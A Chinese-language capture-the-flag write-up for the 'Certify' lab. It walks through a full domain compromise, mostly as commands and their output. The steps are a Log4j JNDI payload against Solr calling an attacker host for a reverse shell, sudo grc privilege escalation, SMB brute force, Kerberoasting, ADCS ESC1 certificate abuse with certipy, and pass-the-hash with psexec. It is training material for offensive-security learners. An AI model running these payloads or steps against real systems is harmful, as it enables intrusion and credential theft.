# 春秋云镜-Certify

  
  
&lt;!--more--&gt;  
## flag01  
```bash  
$ ./fscan_mac -h 39.98.127.236  
  
   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __  
 / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /  
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;  
\____/     |___/\___|_|  \__,_|\___|_|\_\  
                     fscan version: 1.8.3  
start infoscan  
39.98.127.236:21 open  
39.98.127.236:80 open  
39.98.127.236:22 open  
39.98.127.236:8983 open  
[*] alive ports len is: 4  
start vulscan  
[*] WebTitle http://39.98.127.236      code:200 len:612    title:Welcome to nginx!  
[*] WebTitle http://39.98.127.236:8983 code:302 len:0      title:None 跳转url: http://39.98.127.236:8983/solr/  
[*] WebTitle http://39.98.127.236:8983/solr/ code:200 len:16555  title:Solr Admin  
```  
`http://39.98.127.236:8983/solr/#/` 存在`log4j`漏洞，直接打JNDI注入。  
```  
/solr/admin/collections?action=${jndi:ldap://8.137.71.171:1389/Basic/ReverseShell/8.137.71.171/1234}  
```  
获得`shell`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031951956.png)
`python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;`  
`sudo -l`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031953454.png)
利用`grc`提权  
https://gtfobins.github.io/gtfobins/grc/  
```  
sudo grc --pty /bin/sh  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505031955955.png)
`flag{ccdcbc43-b91b-4f66-ab7d-cbdca7ad6ebb}`  
## 0x02 flag02  
上传`frp`和`fscan`  
`ifconfig`得到内网`IP`  
`172.22.9.19`  
```bash  
nohup ./frpc -c frpc.ini &amp;  
nohup ./fscan -h 172.22.9.19/24 &amp;  
root@ubuntu:/opt/solr-8.11.0/server# cat result.txt  
cat result.txt  
172.22.9.47:21 open  
172.22.9.47:80 open  
172.22.9.7:80 open  
172.22.9.47:22 open  
172.22.9.19:80 open  
172.22.9.19:22 open  
172.22.9.7:88 open  
172.22.9.19:8983 open  
172.22.9.26:445 open  
172.22.9.47:445 open  
172.22.9.7:445 open  
172.22.9.26:139 open  
172.22.9.47:139 open  
172.22.9.26:135 open  
172.22.9.7:139 open  
172.22.9.7:135 open  
[*] WebTitle http://172.22.9.19        code:200 len:612    title:Welcome to nginx!  
[*] NetInfo   
[*]172.22.9.7  
   [-&gt;]XIAORANG-DC  
   [-&gt;]172.22.9.7  
[*] NetInfo   
[*]172.22.9.26  
   [-&gt;]DESKTOP-CBKTVMO  
   [-&gt;]172.22.9.26  
[*] WebTitle http://172.22.9.47        code:200 len:10918  title:Apache2 Ubuntu Default Page: It works  
[*] NetBios 172.22.9.7      [&#43;] DC:XIAORANG\XIAORANG-DC      
[*] NetBios 172.22.9.26     DESKTOP-CBKTVMO.xiaorang.lab        Windows Server 2016 Datacenter 14393  
[*] NetBios 172.22.9.47     fileserver                          Windows 6.1  
[*] OsInfo 172.22.9.47  (Windows 6.1)  
[*] WebTitle http://172.22.9.19:8983   code:302 len:0      title:None 跳转url: http://172.22.9.19:8983/solr/  
[*] WebTitle http://172.22.9.7         code:200 len:703    title:IIS Windows Server  
[*] WebTitle http://172.22.9.19:8983/solr/ code:200 len:16555  title:Solr Admin  
[&#43;] PocScan http://172.22.9.7 poc-yaml-active-directory-certsrv-detect   
```  
得到存活IP  
```  
172.22.9.7 XIAORANG-DC   
172.22.9.19 Solr Admin        
172.22.9.26 DESKTOP-CBKTVMO   
172.22.9.47 fileserver  
```  
其中存在`fileserver`，可能是文件共享，尝试登陆一下  
```bash  
# nlrvana @ MacBookPro in ~/Desktop/HackTools [20:08:47]  
$ smbclient -L 172.22.9.47  
Can&#39;t load /opt/homebrew/etc/smb.conf - run testparm to debug it  
Password for [WORKGROUP\nlrvana]:  
  
	Sharename       Type      Comment  
	---------       ----      -------  
	print$          Disk      Printer Drivers  
	fileshare       Disk      bill share  
	IPC$            IPC       IPC Service (fileserver server (Samba, Ubuntu))  
SMB1 disabled -- no workgroup available  
# nlrvana @ MacBookPro in ~/Desktop/HackTools [20:09:30] C:1  
$ smbclient //172.22.9.47/fileshare  
Can&#39;t load /opt/homebrew/etc/smb.conf - run testparm to debug it  
Password for [WORKGROUP\nlrvana]:  
Try &#34;help&#34; to get a list of possible commands.  
smb: \&gt;  
```  
根目录获得`personnel.db`，在`secret/flag02.txt`获得`flag`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032015414.png)
`flag{8feee52d-c7f2-472d-894d-3396d2e63183}`  
## flag03&amp;flag04  
获得一句`hint`  
`Yes, you have enumerated smb. But do you know what an SPN is?`  
应该是枚举`SPN`，打`Kerberoasting`  
刚才还下载一个数据库，查看一下  
存在三张表，分别有用户名和密码  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032021499.png)
导出这三张表的数据，爆破一下。  
只剩下`172.22.9.26`和`172.22.9.7`，其中一个是DC，所以选择另一台机器爆破。  
这里需要枚举`smb`服务，而不是`rdp`，因为用户并无法登陆`rdp`  
```  
proxychains4 hydra -L user.txt -P pwd.txt 172.22.9.26 smb &gt;&gt; result.txt  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032123255.png)
得到账号和密码  
```  
zhangjian:i9XDE02pLVf  
liupeng:fiAzGwEMgTY  
```  
但是无法`RDP`，利用这个两个枚举`SPN`  
```bash  
# nlrvana @ MacBookPro in ~/Desktop/HackTools/4、内网渗透/4.6-内网横向/impacket-0.12.0/examples [20:35:04]  
$ python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies  
  
ServicePrincipalName                   Name      MemberOf  PasswordLastSet             LastLogon  Delegation  
-------------------------------------  --------  --------  --------------------------  ---------  ----------  
TERMSERV/desktop-cbktvmo.xiaorang.lab  zhangxia            2023-07-14 12:45:45.213944  &lt;never&gt;  
WWW/desktop-cbktvmo.xiaorang.lab/IIS   zhangxia            2023-07-14 12:45:45.213944  &lt;never&gt;  
TERMSERV/win2016.xiaorang.lab          chenchen            2023-07-14 12:45:39.767035  &lt;never&gt;  
  
  
  
[-] CCache file is not found. Skipping...  
$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$2840241ef95f59ef359d9812401f709d$103f49254e1188fc5cc6d555c9ceff318b644007f72810f05c1834b7d2522739542cec8621206a0f52953cc1470600e168f03f6b43746c33b4585205ead9bb02d35cbd9496eb976dbb12d98a39ae4aff3eed30cc551510856a02187a6051100e3f6c186ff173470b5f624ba24d3b87dd42c092e34165aca5f42b5bc0f42c8185a0de212bbe9739eea6c91ff54927dc634a13e07244bbbbfee670ec06b8027457130751a841949898cfcd0024ac7589ac931b422ba6ba84276fe2ba1477d0a41ec3d8afaa6f92c221958d9c195890e384656f30457223d92abac2d7b98d2b12e2bc17f197c09543681d23e4b2811b7be0c6a2cc5de7fc2bea8ade828d86688be969a893d474ea461c5456ac043632b867f368ca74563c72a16946917ad287e056754447ee55238fb3e93ce03f7bd94c9ecf7ada40c9ee4f05526203363c28ca2b667ca4d8a73ed0419d26a2c9f84cb6093b2099f704b87d00dae1747ecf70f22da93dd9a56f9be663575772b424dca0d549a346f7fc22acc1620ab9ecd0b22e9225e0ca8ad694db4b4f58dfcc8eed40e5b5fa9c547367cd05128602454089686d57f5991206b705f366b5304c9c5e61c2774fc40e578b25a9472d434ce22c23351bfc15ea87b77dc071fa0865bfc64922e046e1f3a18837b8322ff82926b65c84e6ee7ebc956ad4628b8cd1e477b626506f140583289501a47f2371feb07e07ce819a2a4fd216cb69df549497eabae8e25d1c6678b351f40c3936e2518e1a637e01b4a9004d9169e76b061fb295e8b555240c6a8614d3b5a2ba173d659c55fa9c6924cfb7d0116567073e888a0851a7a9f50b8458ac1cf348063bf66b9ed2c8a95579d36fb43f9ce136a1dc3d95dbcc2522dbc89a6fed2eec96bc1bcce2c29e080e942f1980be8a5a9174cee2368255dfb183d743a4ca350dfb195e6bc0cee2c240279db7eafb6156682bd9a79b25e232870c40a71c83110805d7a3d57f185b72d5631ec6cfd6f5b03b4f0edc6cf7596b194a3fd9ef760f513b246b7def65d883340d5859eddcd60458d214040774834b200d3d721f7c9273faa944b6f42e261f8ab517f6a0937e1d1ce3c32a74fcbb90eba5a4c6919d2f5443faacf6e8303ca60b66ea05c9ba10499f511d43f308247505734ead3993bf62daf7f19cc7ee1d9068a5f9d369bb1a5235ea7e834b7488766faf8802926692914d324e9bebdc5ffbfa617aefe5cef09f5ef69979be76c67d2ae5bd03293863599762e9ec85051579a7d3a31ddd3866368c31adcc6b130ed133c34f8831e1774f00394163341a0088b6f8290c06701975c4ebf6df0d7a083484b452939435c7f61e839241d043748eb822fe99ab40a211035aa0126ba749102df52c83a8e05b7e6c388e999da9bf1081683849e9b26efa510a7c24fb35f7cc4c0ddea6a1a6b977260c3805a63fda8992e583f3354534b6953a421c8b0b2049a7433ddaa7a206b92417842207cdd9dbee3d824e8d56ed25b4a7f998b637  
$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$63cfc265f167a49ec722e549d140162d$19f68e9710f1c992c0cf4b856ec8f7e9fd8d0b226c10e4921615c4f9b1eb5bae7eb6227cdd4af882135a243891bc01a59a330c222a12be4e4e8126d16738889114c430034734e74b3b33d9745f9a14e6af74cb27d56f51ca946d147ea42515210832c1d1992b078a534146c3f7981f58eaafdeff3963d43f7606193de4c886fb28c6e4a52b4eaabebc8604eef3247658b3d7d1ca9f9edc0a419fd0668b7d0b1e0175f85ccd72a485ce925d85b3bae8042a2b6ae323b1099434ffccf65e772bfc2b9dc6369ab451b95ca4160635d5406e92e309cda0a8d8517e9f429f2e38dec4c57932dbbb917e0ee0c7668e1836b86c44f3bfc007b163e87e2cb7c628ba224a7c7dd7d362e884a548da91a494a01e6bbc64bbc00012bac33446a758051f4b8b2b1810b5215ab6394469f26ec2e7c61f8afb13fbacd4a4a7ab5d1113916de6ab9d25da923ae1914a6ea627ae721ef2bc439bf3a66fbe91e6eb639660209ff7c2e826b3afb8042fb4afe1e951c9b66d7264aa72b33fa7e8c08a44bfc27e765c6040373b1855cf783c43a9a744b5c27b292ad519d53f6805c0014b1857eb5bc8370845eb7db283d1825701e74f28d3904fe3c87ff72dc353f0480d945d1e820e53d6f7bac97bc99c0c2e09343e6df0e133b4374ea020854e5629e02188bda457792bbd0f831f906d4019d382aef3fac560dd37d1ef3460eaf05eb0f0181401b023254ba828d1c1c86c4afd5d87755844a4185d48e37762d06cb0ed13ec495c040346cd553725a6d523aeb5f712670925057b22834505746709912c1ceccd7ed617331dcff5029d2d0f1a368797882b7d7e7279968676978aebb403baca483368c349d216fc10ec141b85000d3dd81f268e2d67808740e1cc30de14dfd53270d1bea64303bdcc0104e34f92afd0c2ed62e6d762f048cf3009d1745c8f6f6a755b8c10e57aac5c1e5e978f7a45a57e6be7361f7d16b282c815e2a1037b6ca1c61b31c8e485ef2a88e1c127ff31b954ae0aa2c68baeadd91ef6eee94f545c643f4b82bf5411c57838ba4f809fcc45711d2a6a3f34d5f85478158ba0b2091e033dbacbb2604bee5defde130c5977b7179caa0313ac33b3ae791ca19c0c150cf0aa4b8149c0aba5c9c3011ee042f1d62a5fde5a47d1665ae392b04d294f8ea1acaa8634d575961107f3652d8d9f7f2b6c5d3b0e97ccb2c8a2b5c13d9e5f3bf91ab0555380d88d32cf121f4374f92fef64346c63dee6d4d2d79a2d9d3a6a8ce86832d7b7dc0ae68ba84e614106834c136339ad87a7d3a8e90fb1af751138c7e13ea535a7a06a3c74daf3f5963ac8adfb6bf407b0f2a0661a103f9ae0074baf9b20ed98d4f6955d32401f057ea72cc87cce2ed6e561d1ebae639092a6514b696935c216a86e21c122fa6edfbaa5b8ae3244c1c0bef44de1f1dd354277eb619c3d530be88c0a0823e78ba27a03297a7b5bbe16cc0592fcdc92b3a6bd92d23d4c02cee285b47ec19eeac1ad67a92a400b698168  
```  
获得了两个`TGS`进行爆破，  
`hashcat -m 13100 -a 0 &#39;$krb5tgs$23$*zhangxia$XIAORANG.LAB$xiaorang.lab/zhangxia*$2840241ef95f59ef359d9812401f709d$103f49254e1188fc5cc6d555c9ceff318b644007f72810f05c1834b7d2522739542cec8621206a0f52953cc1470600e168f03f6b43746c33b4585205ead9bb02d35cbd9496eb976dbb12d98a39ae4aff3eed30cc551510856a02187a6051100e3f6c186ff173470b5f624ba24d3b87dd42c092e34165aca5f42b5bc0f42c8185a0de212bbe9739eea6c91ff54927dc634a13e07244bbbbfee670ec06b8027457130751a841949898cfcd0024ac7589ac931b422ba6ba84276fe2ba1477d0a41ec3d8afaa6f92c221958d9c195890e384656f30457223d92abac2d7b98d2b12e2bc17f197c09543681d23e4b2811b7be0c6a2cc5de7fc2bea8ade828d86688be969a893d474ea461c5456ac043632b867f368ca74563c72a16946917ad287e056754447ee55238fb3e93ce03f7bd94c9ecf7ada40c9ee4f05526203363c28ca2b667ca4d8a73ed0419d26a2c9f84cb6093b2099f704b87d00dae1747ecf70f22da93dd9a56f9be663575772b424dca0d549a346f7fc22acc1620ab9ecd0b22e9225e0ca8ad694db4b4f58dfcc8eed40e5b5fa9c547367cd05128602454089686d57f5991206b705f366b5304c9c5e61c2774fc40e578b25a9472d434ce22c23351bfc15ea87b77dc071fa0865bfc64922e046e1f3a18837b8322ff82926b65c84e6ee7ebc956ad4628b8cd1e477b626506f140583289501a47f2371feb07e07ce819a2a4fd216cb69df549497eabae8e25d1c6678b351f40c3936e2518e1a637e01b4a9004d9169e76b061fb295e8b555240c6a8614d3b5a2ba173d659c55fa9c6924cfb7d0116567073e888a0851a7a9f50b8458ac1cf348063bf66b9ed2c8a95579d36fb43f9ce136a1dc3d95dbcc2522dbc89a6fed2eec96bc1bcce2c29e080e942f1980be8a5a9174cee2368255dfb183d743a4ca350dfb195e6bc0cee2c240279db7eafb6156682bd9a79b25e232870c40a71c83110805d7a3d57f185b72d5631ec6cfd6f5b03b4f0edc6cf7596b194a3fd9ef760f513b246b7def65d883340d5859eddcd60458d214040774834b200d3d721f7c9273faa944b6f42e261f8ab517f6a0937e1d1ce3c32a74fcbb90eba5a4c6919d2f5443faacf6e8303ca60b66ea05c9ba10499f511d43f308247505734ead3993bf62daf7f19cc7ee1d9068a5f9d369bb1a5235ea7e834b7488766faf8802926692914d324e9bebdc5ffbfa617aefe5cef09f5ef69979be76c67d2ae5bd03293863599762e9ec85051579a7d3a31ddd3866368c31adcc6b130ed133c34f8831e1774f00394163341a0088b6f8290c06701975c4ebf6df0d7a083484b452939435c7f61e839241d043748eb822fe99ab40a211035aa0126ba749102df52c83a8e05b7e6c388e999da9bf1081683849e9b26efa510a7c24fb35f7cc4c0ddea6a1a6b977260c3805a63fda8992e583f3354534b6953a421c8b0b2049a7433ddaa7a206b92417842207cdd9dbee3d824e8d56ed25b4a7f998b637&#39; rockyou.txt`  
获得密码  
`zhangxia:MyPass2@@6`  
`RDP`连接  
利用`BloodHound`收集信息  
在域成员中存在`ADCS ECS1`证书配置错误  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505032048100.png)
直接利用`certipy`申请`administrator`的证书  
```bash  
# nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:54:46]  
$ certipy find -u &#39;zhangxia@xiaorang.lab&#39; -password &#39;MyPass2@@6&#39; -dc-ip 172.22.9.7 -vulnerable -stdout  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Finding certificate templates  
[*] Found 35 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 13 enabled certificate templates  
[!] Failed to resolve: XIAORANG-DC.xiaorang.lab  
[*] Trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via CSRA  
[!] Got error while trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via CSRA: [Errno 8] nodename nor servname provided, or not known  
[*] Trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via RRP  
[!] Got error while trying to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39; via RRP: [Errno Connection error (XIAORANG-DC.xiaorang.lab:445)] [Errno 8] nodename nor servname provided, or not known  
[!] Failed to get CA configuration for &#39;xiaorang-XIAORANG-DC-CA&#39;  
[!] Failed to resolve: XIAORANG-DC.xiaorang.lab  
[!] Got error while trying to check for web enrollment: [Errno 8] nodename nor servname provided, or not known  
[*] Enumeration output:  
Certificate Authorities  
  0  
    CA Name                             : xiaorang-XIAORANG-DC-CA  
    DNS Name                            : XIAORANG-DC.xiaorang.lab  
    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab  
    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5  
    Certificate Validity Start          : 2023-07-14 04:33:21&#43;00:00  
    Certificate Validity End            : 2028-07-14 04:43:21&#43;00:00  
    Web Enrollment                      : Disabled  
    User Specified SAN                  : Unknown  
    Request Disposition                 : Unknown  
    Enforce Encryption for Requests     : Unknown  
Certificate Templates  
  0  
    Template Name                       : XR Manager  
    Display Name                        : XR Manager  
    Certificate Authorities             : xiaorang-XIAORANG-DC-CA  
    Enabled                             : True  
    Client Authentication               : True  
    Enrollment Agent                    : False  
    Any Purpose                         : False  
    Enrollee Supplies Subject           : True  
    Certificate Name Flag               : EnrolleeSuppliesSubject  
    Enrollment Flag                     : PublishToDs  
                                          IncludeSymmetricAlgorithms  
    Private Key Flag                    : 16777216  
                                          65536  
                                          ExportableKey  
    Extended Key Usage                  : Encrypting File System  
                                          Secure Email  
                                          Client Authentication  
    Requires Manager Approval           : False  
    Requires Key Archival               : False  
    Authorized Signatures Required      : 0  
    Validity Period                     : 1 year  
    Renewal Period                      : 6 weeks  
    Minimum RSA Key Length              : 2048  
    Permissions  
      Enrollment Permissions  
        Enrollment Rights               : XIAORANG.LAB\Domain Admins  
                                          XIAORANG.LAB\Domain Users  
                                          XIAORANG.LAB\Enterprise Admins  
                                          XIAORANG.LAB\Authenticated Users  
      Object Control Permissions  
        Owner                           : XIAORANG.LAB\Administrator  
        Write Owner Principals          : XIAORANG.LAB\Domain Admins  
                                          XIAORANG.LAB\Enterprise Admins  
                                          XIAORANG.LAB\Administrator  
        Write Dacl Principals           : XIAORANG.LAB\Domain Admins  
                                          XIAORANG.LAB\Enterprise Admins  
                                          XIAORANG.LAB\Administrator  
        Write Property Principals       : XIAORANG.LAB\Domain Admins  
                                          XIAORANG.LAB\Enterprise Admins  
                                          XIAORANG.LAB\Administrator  
    [!] Vulnerabilities  
      ESC1                              : &#39;XIAORANG.LAB\\Domain Users&#39; and &#39;XIAORANG.LAB\\Authenticated Users&#39; can enroll, enrollee supplies subject and template allows client authentication  
```  
搜索到证书模版，模拟`administrator@xiaorang.lab`用户申请证书  
```bash  
# nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:58:59]  
$ certipy req -u &#39;zhangxia@xiaorang.lab&#39; -p &#39;MyPass2@@6&#39; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &#34;xiaorang-XIAORANG-DC-CA&#34; -template &#34;XR Manager&#34; -upn administrator@xiaorang.lab  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Successfully requested certificate  
[*] Request ID is 6  
[*] Got certificate with UPN &#39;administrator@xiaorang.lab&#39;  
[*] Certificate has no object SID  
[*] Saved certificate and private key to &#39;administrator.pfx&#39;  
```  
继续申请`TGT`  
```bash  
# nlrvana @ MacBookPro in ~/Desktop/HackTools/6、字典 [20:59:01]  
$ certipy auth -pfx administrator.pfx -dc-ip 172.22.9.7  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Using principal: administrator@xiaorang.lab  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to &#39;administrator.ccache&#39;  
[*] Trying to retrieve NT hash for &#39;administrator&#39;  
[*] Got hash for &#39;administrator@xiaorang.lab&#39;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80  
```  
拿到`hash`，打横向渗透  
```bash  
python3 psexec.py xiaorang.lab/Administrator@172.22.9.7 -hashes :2f1b57eefb2d152196836b0516abea80 -codec gbk  
C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag04.txt  
  ______                 _  ___  
 / _____)           _   (_)/ __)  
| /      ____  ____| |_  _| |__ _   _  
| |     / _  )/ ___)  _)| |  __) | | |  
| \____( (/ /| |   | |__| | |  | |_| |  
 \______)____)_|    \___)_|_|   \__  |  
                               (____/  
  
flag04: flag{0afd83d9-90b2-447c-92f0-ce02a95dd97e}  
  
python3 psexec.py xiaorang.lab/Administrator@172.22.9.26 -hashes :2f1b57eefb2d152196836b0516abea80 -codec gbk  
C:\Windows\system32&gt; type C:\Users\Administrator\flag\flag03.txt  
                                ___              .-.  
                               (   )      .-.   /    \  
  .--.      .--.    ___ .-.     | |_     ( __)  | .`. ;   ___  ___  
 /    \    /    \  (   )   \   (   __)   (&#39;&#39;&#34;)  | |(___) (   )(   )  
|  .-. ;  |  .-. ;  | &#39; .-. ;   | |       | |   | |_      | |  | |  
|  |(___) |  | | |  |  / (___)  | | ___   | |  (   __)    | |  | |  
|  |      |  |/  |  | |         | |(   )  | |   | |       | &#39;  | |  
|  | ___  |  &#39; _.&#39;  | |         | | | |   | |   | |       &#39;  `-&#39; |  
|  &#39;(   ) |  .&#39;.-.  | |         | &#39; | |   | |   | |        `.__. |  
&#39;  `-&#39; |  &#39;  `-&#39; /  | |         &#39; `-&#39; ;   | |   | |        ___ | |  
 `.__,&#39;    `.__.&#39;  (___)         `.__.   (___) (___)      (   )&#39; |  
                                                           ; `-&#39; &#39;  
                                                            .__.&#39;  
  
      flag03: flag{fbbb0c3c-dd0f-4fdf-9c7b-a6654cb99900}  
```  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-certify/  

